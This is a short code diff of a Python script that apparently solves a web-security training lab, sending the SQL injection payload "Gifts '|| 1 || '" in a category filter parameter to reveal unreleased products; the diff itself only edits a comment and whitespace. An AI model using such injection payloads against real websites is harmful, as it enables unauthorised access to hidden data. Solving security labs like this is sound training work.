@@ -29,12 +29,14 @@ print(Fore.BLUE + "❯ Injection parameter: " + Fore.YELLOW + "category")
 # payload to retrieve unreleased products
 payload = f"Gifts '|| 1 || '"
 
-try:  # inj
+try:  # inject payload in category parameter
     injection = requests.get(f"{url}/filter?category={payload}")
+    
     # if the response is OK and unreleased products is retrieved
     if injection.status_code == 200:
         print(
             Fore.WHITE + "❯ Injecting payload to retrieve unreleased products.. " + Fore.GREEN + "OK")
+    
         print(
             Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
 except:
